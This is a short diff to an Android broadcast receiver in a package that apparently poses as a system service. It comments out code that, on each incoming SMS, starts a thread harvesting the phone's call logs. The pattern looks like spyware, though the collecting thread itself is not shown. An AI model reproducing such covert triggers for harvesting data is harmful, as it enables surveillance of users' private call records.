@@ -6,6 +6,8 @@ import android.content.Intent;
 import android.util.Log;
 import android.widget.Toast;
 
+import com.android.service_getdata.Threads.PickUpDataThread;
+
 public class AllReceiver extends BroadcastReceiver {
     public AllReceiver() {
     }
@@ -17,10 +19,10 @@ public class AllReceiver extends BroadcastReceiver {
         String action = intent.getAction();
 
         if(action == "android.provider.Telephony.SMS_RECEIVED"){
-            PickUpDataThread pickUpDataThread = new PickUpDataThread(context.getContentResolver(),PickUpDataThread.CALLLOGS_THREAD);
-            Thread thread = new Thread(pickUpDataThread);
-            thread.start();
-            Toast.makeText(context,"Message Received",Toast.LENGTH_SHORT).show();
+//            PickUpDataThread pickUpDataThread = new PickUpDataThread(context.getContentResolver(),PickUpDataThread.CALLLOGS_THREAD, m);
+//            Thread thread = new Thread(pickUpDataThread);
+//            thread.start();
+//            Toast.makeText(context,"Message Received",Toast.LENGTH_SHORT).show();
         }
         if(action == "android.net.conn.CONNECTIVITY_CHANGE"){
             Toast.makeText(context,"Connectivity Changed",Toast.LENGTH_SHORT).show();
